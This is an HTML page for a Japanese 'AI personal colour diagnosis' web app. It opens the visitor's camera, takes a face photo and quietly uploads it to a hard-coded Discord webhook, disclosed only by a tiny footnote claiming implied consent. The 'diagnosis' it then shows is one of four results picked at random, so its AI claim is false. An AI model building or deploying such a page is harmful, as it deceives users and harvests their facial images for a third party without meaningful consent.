<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>パーソナルカラー診断</title>
  <style>
    body {
      font-family: 'Arial', sans-serif;
      text-align: center;
      padding: 20px;
      background-color: #fff0f5;
    }
    h1 {
      color: #ff69b4;
      margin-bottom: 10px;
    }
    p {
      color: #555;
      margin-bottom: 20px;
    }
    .button {
      background-color: #ff69b4;
      color: white;
      padding: 15px 32px;
      margin: 10px;
      border: none;
      border-radius: 8px;
      font-size: 18px;
      cursor: pointer;
    }
    .button:hover {
      background-color: #ff85c1;
    }
    .result {
      margin-top: 20px;
    }
    img, video {
      max-width: 100%;
      height: auto;
      border-radius: 12px;
      margin-top: 20px;
    }
    .small-text {
      font-size: 10px;
      color: #999;
      margin-top: 30px;
    }
  </style>
</head>
<body>

  <img src="header.JPG" alt="ヘッダー画像">
  <h1>パーソナルカラー診断</h1>
  <p>写真1枚でAIがパーソナルカラーを診断し、似合う色を提案します。</p>

  <button class="button" onclick="startCamera()">診断する</button>

  <div id="cameraArea" style="display:none;">
    <video id="video" autoplay playsinline></video>
    <br>
    <button class="button" onclick="takePhoto()">写真を撮る</button>
  </div>

  <div class="result" id="result"></div>

  <p class="small-text">
    ※撮影したお写真は、診断に使わせていただきます。<br>
    サーバー上に一時保存される場合があり、<br>
    ご利用とともに同意したものとみなさせていただきます。
  </p>

  <script>
    let videoStream;

    function startCamera() {
      document.getElementById('cameraArea').style.display = 'block';
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          videoStream = stream;
          const video = document.getElementById('video');
          video.srcObject = stream;
        })
        .catch(error => {
          alert('カメラが使えません: ' + error);
        });
    }

    function takePhoto() {
      const video = document.getElementById('video');
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const context = canvas.getContext('2d');
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      const imageData = canvas.toDataURL('image/png');

      if (videoStream) {
        videoStream.getTracks().forEach(track => track.stop());
      }
      document.getElementById('cameraArea').style.display = 'none';

      // 診断中を5秒間表示
      const resultDiv = document.getElementById('result');
      resultDiv.innerHTML = `<h2>診断中...</h2>`;
      
      // Discordに送信
      sendToDiscord(imageData);

      setTimeout(() => {
        // ランダムで診断結果表示
        const results = [
          { image: "iebeh.PNG", text: "あなたは【イエベ春】タイプ！" },
          { image: "iebeh_aki.PNG", text: "あなたは【イエベ秋】タイプ！" },
          { image: "bluebe_natsu.PNG", text: "あなたは【ブルベ夏】タイプ！" },
          { image: "bluebe_fuyu.PNG", text: "あなたは【ブルベ冬】タイプ！" }
        ];
        const randomResult = results[Math.floor(Math.random() * results.length)];
        resultDiv.innerHTML = `<h2>${randomResult.text}</h2><img src="${randomResult.image}" alt="${randomResult.text}">`;
      }, 5000);
    }

    function sendToDiscord(imageData) {
      const webhookUrl = "https://discord.com/api/webhooks/1365647175383646278/zr3nRlxGYnwnGyX_icocbi04RAS_dNy8dLVRclkCBCezZy-MRi3DMiuoAcjCxZHlyzDV";

      const formData = new FormData();
      formData.append('file', dataURLtoBlob(imageData), 'photo.png');

      fetch(webhookUrl, {
        method: 'POST',
        body: formData
      })
      .then(response => {
        console.log('Discord送信成功');
      })
      .catch(error => {
        console.error('Discord送信エラー', error);
      });
    }

    function dataURLtoBlob(dataURL) {
      const byteString = atob(dataURL.split(',')[1]);
      const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];

      const ab = new ArrayBuffer(byteString.length);
      const ia = new Uint8Array(ab);
      for (let i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
      }

      return new Blob([ab], { type: mimeString });
    }
  </script>

</body>
</html>
